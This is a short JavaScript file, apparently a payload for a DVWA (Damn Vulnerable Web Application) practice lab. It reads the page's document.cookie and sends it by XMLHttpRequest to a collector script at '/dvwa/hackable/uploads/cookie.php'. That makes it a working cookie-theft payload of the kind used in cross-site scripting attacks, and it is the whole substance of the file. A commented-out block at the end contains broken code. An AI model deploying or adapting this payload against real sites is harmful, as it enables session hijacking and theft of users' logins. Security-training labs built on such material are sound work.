var x;
var params= "cookie="+encodeURIComponent(document.cookie)+"";



		
if (window.XMLHttpRequest) { 
	x= new XMLHttpRequest();
} else {
	x = new ActiveXObject("Microsoft.XMLHTTP"); 
}

try {
	x.open('GET','/dvwa/hackable/uploads/cookie.php?' + params,true);
	x.setRequestHeader("Connection", "close");
	x.send();	
} catch (e) {
	alert("faile to create  XMLHttpRequest");
} 

/**
var userdiv = document.getElementsById("div");

for (var i = 0; i < divs.length; i++) {
    var div = divs[i];
    //var text = div.innerText || div.textContent;
	alert(div.id);
}
*/
	






